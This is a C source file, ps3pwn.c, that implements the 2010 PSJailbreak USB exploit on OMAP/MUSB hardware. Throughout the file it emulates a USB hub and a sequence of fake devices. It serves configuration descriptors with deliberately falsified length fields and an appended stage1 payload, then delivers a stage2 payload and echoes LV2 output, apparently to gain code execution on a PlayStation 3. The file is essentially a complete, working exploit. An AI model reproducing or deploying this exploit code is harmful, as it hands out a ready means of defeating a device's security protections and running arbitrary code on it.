/*  ps3pwn.c - implementation of the PSJailbreak exploit for OMAP/MUSB devices

Copyright (C) 2010  Hector Martin "marcan" <hector@marcansoft.com>

This code is licensed to you under the terms of the GNU GPL, version 2;
see file COPYING or http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt
*/

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#include "mmio.h"
#include "usb.h"
#include "musb.h"

#define DO_CLOCK

#define MIN(a,b) ((a)>(b)?(b):(a))
#define MAX(a,b) ((a)<(b)?(b):(a))

char *cm_map;

#define CM_ICLKEN1_CORE 0xa10
#define cm_read32(x) read32(cm_map,x)
#define cm_write32(x,y) write32(cm_map,x,y)

u8 stage1_buf[0x1000];
int stage1_size = 0;
u8 *stage2_buf;
int stage2_size = 0;

int main(int argc, char **argv)
{
	FILE *f;

	if (argc != 2 && argc != 3) {
		printf("Usage: %s stage1.bin [stage2.bin]\n", argv[0]);
		return 1;
	}

	printf("Loading %s\n", argv[1]);
	f = fopen(argv[1],"rb");
	if (!f) {
		perror(argv[1]);
		return 1;
	}
	stage1_size = fread(stage1_buf, 1, 0x1000, f);
	fclose(f);
	printf("Stage1 size is 0x%x\n", stage1_size);

	if (argc == 3) {
		printf("Loading %s\n", argv[2]);
		f = fopen(argv[2],"rb");
		if (!f) {
			perror(argv[2]);
			return 1;
		}
		fseek(f, 0, SEEK_END);
		stage2_size = ftell(f);
		fseek(f, 0, SEEK_SET);
		stage2_buf = malloc(stage2_size);
		fread(stage2_buf, 1, stage2_size, f);
		fclose(f);
		printf("Stage2 size is 0x%x\n", stage2_size);
	} else {
		printf("Not using a stage2\n");
	}

#ifdef DO_CLOCK
	cm_map = mmio_map(0x48004000, 0x1000);
	u32 clks = cm_read32(CM_ICLKEN1_CORE);
	printf("Clocks: %08x\n", clks);
	if (!(clks&0x00000010)) {
		printf("Enabling HSOTG clock 1\n");
		clks |= 0x10;
		cm_write32(CM_ICLKEN1_CORE, clks);
		printf("Clocks: %08x\n", cm_read32(CM_ICLKEN1_CORE));
		usleep(10000);
	}
#endif

	musb_init();

	while(1) {
		printf("Waiting for connection...\n");
		while(get_vbus() != 3);
		printf("VBUS detected!\n");
		usleep(100000);
		usb_connect();
		while(get_vbus() == 3) {
			usb_process();
		}
	}
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////

typedef enum {
	D_HUB,
	D_PWN1,
	D_PWN2,
	D_PWN3,
	D_PWN4,
	D_FINAL,
} device;

device current_dev = 0;
u8 addrs[8] = {0,0,0,0,0,0,0,0};

#include "descriptors.h"

typedef struct {
	u16 status, change;
} port_status;

port_status hub_port_status[7] = {
	{0,0}, // dummy
	{0,0},
	{0,0},
	{0,0},
	{0,0},
	{0,0},
	{0,0},
};

int state = 0;
int advance_counter = 0;
int is_linux = 0;

void next_state(void);

#define SEND_DESCRIPTOR(desc) write_fifo0(desc, MIN(sizeof(desc),wLength))

void switch_dev(device dev, int delay)
{
	if (addrs[dev] == 0)
		printf("Switching to new device %d\n", dev);
	else
		printf("Switching to existing device %d with address %d\n", dev, addrs[dev]);
	usb_set_address(addrs[dev], delay);
	current_dev = dev;
}

void cb_set_address(u8 addr)
{
	printf("Device %d now has address %d\n", current_dev, addr);
	addrs[current_dev] = addr;
	usb_set_address(addr, 1);
}

#define DESC(a,b,c) (((a)<<24)|((b)<<8)|(c))

void cb_get_descriptor(u16 wValue, u16 wIndex, u16 wLength)
{
	static u8 buffer[0x10000];
	int i;
	u8 type = wValue >> 8;
	u8 num = wValue;
	u32 comp = DESC(current_dev,type,num);
	printf("get_descriptor(%d, %d, %d) (0x%x)\n", current_dev, type, num, wLength);
	switch(comp) {
		case DESC(D_HUB, DEVICE, 0): SEND_DESCRIPTOR(hub_dev); break;
		case DESC(D_HUB, CONFIGURATION, 0): SEND_DESCRIPTOR(hub_cfg); break;
		case DESC(D_HUB, HUB, 0): SEND_DESCRIPTOR(hub_hub); break;
		case DESC(D_HUB, 6, 0):
			is_linux = 1;
			printf("Linux detected, aborting device sequencing\n");
			ep0_stall();
			break;

		case DESC(D_PWN1, DEVICE, 0): SEND_DESCRIPTOR(pwn1_dev); break;
		case DESC(D_PWN1, CONFIGURATION, 0):
		case DESC(D_PWN1, CONFIGURATION, 1):
		case DESC(D_PWN1, CONFIGURATION, 2):
		case DESC(D_PWN1, CONFIGURATION, 3):
			memset(buffer, 0, sizeof(buffer));
			memcpy(buffer, pwn1_cfg, sizeof(pwn1_cfg));
			memcpy(buffer + sizeof(pwn1_cfg), stage1_buf, stage1_size);
			if (wLength > 0x9) {
				printf("Hax len\n");
				buffer[2] = 0x12; // wTotalLength = 0x12
				buffer[3] = 0x00;
			}
			write_fifo0(buffer, wLength);
			if (num == 3 && wLength > 0x9) // cue to move on
				next_state();
			break;
		case DESC(D_PWN2, DEVICE, 0): SEND_DESCRIPTOR(pwn2_dev); break;
		case DESC(D_PWN2, CONFIGURATION, 0):
			SEND_DESCRIPTOR(pwn2_cfg);
			if (wLength > 0x9) // cue to move on
				next_state();
			break;
		case DESC(D_PWN3, DEVICE, 0): SEND_DESCRIPTOR(pwn3_dev); break;
		case DESC(D_PWN3, CONFIGURATION, 0):
		case DESC(D_PWN3, CONFIGURATION, 1):
			memcpy(buffer, pwn3_cfg, sizeof(pwn3_cfg));
			i = sizeof(pwn3_cfg);
			while (i < wLength) {
				memcpy(&buffer[i], pwn3_padding, sizeof(pwn3_padding));
				i += sizeof(pwn3_padding);
			}
			write_fifo0(buffer, wLength);
			if (num == 1 && wLength > 0x9) // cue to move on
				next_state();
			break;
		case DESC(D_PWN4, DEVICE, 0): SEND_DESCRIPTOR(pwn4_dev); break;
		case DESC(D_PWN4, CONFIGURATION, 0): SEND_DESCRIPTOR(pwn4_cfg1); break;
		case DESC(D_PWN4, CONFIGURATION, 1):
			memset(buffer, 0, sizeof(buffer));
			memcpy(buffer, pwn4_cfg2, sizeof(pwn4_cfg2));
			if (wLength > 0x9) {
				printf("Hax len\n");
				buffer[2] = 0x00; // wTotalLength = 0x00 (!)
				buffer[3] = 0x00;
			}
			write_fifo0(buffer, wLength);
			break;
		case DESC(D_PWN4, CONFIGURATION, 2):
			SEND_DESCRIPTOR(pwn4_cfg3);
			if (wLength > 0x9) // cue to move on
				next_state();
			break;
		case DESC(D_FINAL, DEVICE, 0): SEND_DESCRIPTOR(final_dev); break;
		case DESC(D_FINAL, CONFIGURATION, 0): SEND_DESCRIPTOR(final_cfg); break;
		default: ep0_stall(); break;
	}
}


void reset_hub_datatog(void)
{
	reset_ep_datatog(1);
}

void port_change(device dev, u16 change)
{
	u8 flagval;
	if (current_dev != D_HUB)
		switch_dev(D_HUB, 0);
	hub_port_status[dev].change |= change;
	flagval = 1<<dev;
	//printf("Kicking hub with 0x%02x\n", flagval);
	write_fifo(1, &flagval, 1);
}

void hub_connect(device dev)
{
	printf("Triggering connection change for port %d\n", dev);
	hub_port_status[dev].status = 0x0103;
	port_change(dev, P_CONNECTION);
}

void hub_disconnect(device dev)
{
	printf("Triggering disconnection change for port %d\n", dev);
	hub_port_status[dev].status = 0x0000;
	port_change(dev, P_CONNECTION);
}

int do_hdr = 1;

enum {
	REQ_PRINT = 1,
	REQ_GET_STAGE2_SIZE,
	REQ_READ_STAGE2_BLOCK
};

#define TYPE_HOST2DEV 0x40
#define TYPE_DEV2HOST 0xc0

int cb_handle_ctl(u8 bmRequestType, u8 bRequest, u16 wValue, u16 wIndex, u16 wLength)
{
	// hub descriptors
	if (bmRequestType == 0xa0 && bRequest == GET_DESCRIPTOR) {
		cb_get_descriptor(wValue, wIndex, wLength);
		return 1;
	}
	// hub status
	if (bmRequestType == 0xa0 && bRequest == GET_STATUS) {
		u8 hub_status[] = { U16(0), U16(0) };
		write_fifo0(hub_status, 4);
		return 1;
	}
	// set port feature
	if (bmRequestType == 0x23 && bRequest == SET_FEATURE) {
		ep0_nodata();
		if (wValue == PORT_POWER) {
			printf("Set port %d power to ON\n", wIndex);
			if (wIndex == 6) // the cue to start the first device
				next_state();
		} else if (wValue == PORT_RESET) {
			printf("Reset port %d\n", wIndex);
			port_change(wIndex, P_RESET);
		} else {
			printf("set_port_feature(%d, %04x)\n", wValue, wIndex);
		}
		return 1;
	}
	if (bmRequestType == 0x23 && bRequest == CLEAR_FEATURE) {
		ep0_nodata();
		if (wValue == PORT_POWER) {
			printf("Set port %d power to OFF\n", wIndex);
		} else if (wValue == C_PORT_CONNECTION) {
			printf("Clear port %d connect change\n", wIndex);
			hub_port_status[wIndex].change &= ~P_CONNECTION;
		} else if (wValue == C_PORT_RESET) {
			printf("Clear port %d reset change\n", wIndex);
			hub_port_status[wIndex].change &= ~P_RESET;
			///////// SWITCH DEVICES HERE
			switch_dev(wIndex, 0);
		} else {
			printf("clear_port_feature(%d, %04x)\n", wValue, wIndex);
		}
		return 1;
	}
	// hub port status
	if (bmRequestType == 0xa3 && bRequest == GET_STATUS) {
		u16 status = hub_port_status[wIndex].status;
		u16 change = hub_port_status[wIndex].change;
		printf("get_port_status(%04x) = %04x %04x\n", wIndex, status, change);
		u8 blob[] = { U16(status), U16(change) };
		write_fifo0(blob, 4);
		if (status == 0 && change == 0) // next state after a disconnect
			next_state();
		return 1;
	}
	if (bmRequestType == TYPE_HOST2DEV && bRequest == REQ_PRINT) {
		char buf[0x400];
		if (wLength > 0x400) {
			printf("WTF\n");
			return 0;
		}
		int len = read_fifo0(buf, wLength);
		char *p = buf;
		while(len--) {
			if (do_hdr) {
				do_hdr = 0;
				printf("[LV2] ");
			}
			printf("%c", *p);
			if (*p == '\n')
				do_hdr = 1;
			p++;
		}
		fflush(stdout);
		return 1;
	}
	if (bmRequestType == TYPE_DEV2HOST && bRequest == REQ_GET_STAGE2_SIZE) {
		printf("get_stage2_size()\n");
		u8 reply[4] = {stage2_size>>24, stage2_size>>16, stage2_size>>8, stage2_size};
		write_fifo0(reply, 4);
		return 1;
	}
	if (bmRequestType == TYPE_DEV2HOST && bRequest == REQ_READ_STAGE2_BLOCK) {
		int offset = wIndex<<12;
		int available = stage2_size - offset;
		int length = wLength;
		printf("read_stage2_block(offset=0x%x,len=0x%x)\n", offset, length);
		if (available < 0)
			available = 0;
		if (length > available) {
			printf("warning: length exceeded, want 0x%x, avail 0x%x\n", length, available);
			length = available;
		}
		write_fifo0(&stage2_buf[offset], length);
		return 1;
	}
	return 0;
}

void cb_set_configuration(int idx)
{
	/*
	// switch back to the hub to keep servicing change requests
	if (current_dev != 0)
		switch_dev(0, 1);
	*/
}

void next_state(void)
{
	if (!is_linux)
		advance_counter = 10;
}

void next_state_wait(int delay)
{
	advance_counter = delay;
}

void sequencer(void)
{
	state++;
	switch(state) {
		case 1:
			hub_connect(D_PWN1);
			break;
		case 2:
			hub_connect(D_PWN2);
			break;
		case 3:
			hub_connect(D_PWN3);
			break;
		case 4:
			hub_disconnect(D_PWN2);
			break;
		case 5:
			hub_connect(D_PWN4);
			break;
		case 6:
			reset_hub_datatog();
			hub_disconnect(D_PWN3);
			break;
		case 7:
			hub_disconnect(D_PWN4);
			break;
		case 8:
			hub_disconnect(D_PWN1);
			break;
		case 9:
			hub_connect(D_FINAL);
			break;
	}
}

void cb_reset(void)
{
	musb_reset();
	current_dev = 0;
	memset(addrs, 0, sizeof(addrs));
	memset(hub_port_status, 0, sizeof(hub_port_status));
	state = 0;
	advance_counter = 0;
	do_hdr = 1;
	is_linux = 0;
}

void cb_sof(void)
{
	if (advance_counter) {
		advance_counter--;
		if (!advance_counter)
			sequencer();
	}
}

void cb_data_in(int endpoint, u8 *data, int size)
{
	printf("Received data on endpoint 0x%02x (%d):\n", endpoint, size);
}
